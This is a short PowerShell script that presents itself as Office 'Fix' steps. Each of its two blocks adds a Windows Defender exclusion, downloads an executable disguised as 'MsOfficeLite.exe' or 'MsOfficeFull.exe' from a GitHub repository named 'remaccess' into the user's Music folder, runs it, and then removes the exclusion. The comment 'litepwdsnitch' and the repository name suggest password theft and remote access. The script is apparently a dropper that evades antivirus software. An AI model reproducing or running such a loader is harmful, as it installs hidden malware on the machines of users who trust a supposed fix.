#litepwdsnitch Fix
$url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/MsOfficeLite.exe"
$Name = [System.IO.Path]::GetFileNameWithoutExtension($url)
$pwdst = Read-Host "Proceed With $Name Fix (y/n)"
if ([string]::IsNullOrEmpty($pwdst)) {
    Start-Sleep -Seconds 1
    $pwdst = "n"
}
if ($pwdst.ToLower() -eq "y") {
    Write-Host "Executing $Name Fix..."
    	$exepath = Join-Path $env:USERPROFILE "Music\$Name.exe"
    	Add-MpPreference -ExclusionPath $exepath
	Invoke-WebRequest -Uri $url -OutFile $exepath	
	Start-Process -FilePath $exepath
 	if ($output -ne $null) {
    	Remove-Item -Path $exepath -Recurse -Force -ErrorAction SilentlyContinue
	} else {}
	Remove-MpPreference -ExclusionPath $exepath
} else {}
#classic-full-st Fix
$url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/MsOfficeFull.exe"
$Name = [System.IO.Path]::GetFileNameWithoutExtension($url)
$pwdst = Read-Host "Proceed With $Name Fix (y/n)"
if ([string]::IsNullOrEmpty($pwdst)) {
    Start-Sleep -Seconds 1
    $pwdst = "n"
}
if ($pwdst.ToLower() -eq "y") {
    Write-Host "Executing $Name Fix..."
    	$exepath = Join-Path $env:USERPROFILE "Music\$Name.exe"
    	Add-MpPreference -ExclusionPath $exepath
	Invoke-WebRequest -Uri $url -OutFile $exepath	
	Start-Process -FilePath $exepath
 	if ($output -ne $null) {
    	Remove-Item -Path $exepath -Recurse -Force -ErrorAction SilentlyContinue
	} else {}
	Remove-MpPreference -ExclusionPath $exepath
} else {}
